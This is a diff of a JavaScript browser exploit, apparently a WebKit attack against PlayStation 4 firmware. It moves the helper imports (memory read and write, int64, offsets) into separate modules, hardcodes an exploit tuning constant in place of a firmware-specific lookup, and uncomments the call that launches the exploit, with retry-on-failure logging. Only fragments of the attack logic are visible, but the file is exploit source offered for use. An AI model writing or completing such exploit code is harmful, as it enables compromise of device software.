@@ -1,7 +1,19 @@
-import { Int, KB, MB } from '/offset.js';
-import { die, DieError, debug_log, clear_log, sleep, hex, hex_np, align, BufferView, Memory, mem, } from '/utils.js';
+import { Int } from '/module/int64.js';
+import { Memory, mem } from './module/mem.js';
+import { KB, MB } from '/module/offset.js';
+import { BufferView } from '/module/rw.js';
+import {
+    die,
+    DieError,
+    debug_log,
+    clear_log,
+    sleep,
+    hex,
+    hex_np,
+    align,
+} from '/module/utils.js';
 import * as config from '/config.js';
-import * as off from '/offset.js';
+import * as off from '/module/offset.js';
 addEventListener('unhandledrejection', event => {
     const reason = event.reason;
     alert(
@@ -37,7 +49,7 @@ const [is_ps4, version] = (() => {
     }
     return [is_ps4, version];
 })();
-const ssv_len = (() => {
+/*const ssv_len = (() => {
     if (0x600 <= config.target && config.target < 0x650) {
         return 0x58;
     }
@@ -47,8 +59,8 @@ const ssv_len = (() => {
     if (0x650 <= config.target && config.target < 0x900) {
         return 0x48;
     }
-})();
-//const ssv_len = 0x50;
+})();*/
+const ssv_len = 0x50;
 const num_fsets = 0x180;
 const num_spaces = 0x40;
 const num_adjs = 6;
@@ -524,7 +536,7 @@ async function run() {
             return new int64(res.low, res.high);
         }
     };       
-    //run_hax();
+    run_hax();
     } catch (error) {
         debug_log("[!] Webkit exploit failed: " + error);
         debug_log("[+] Retrying in 2 seconds...");
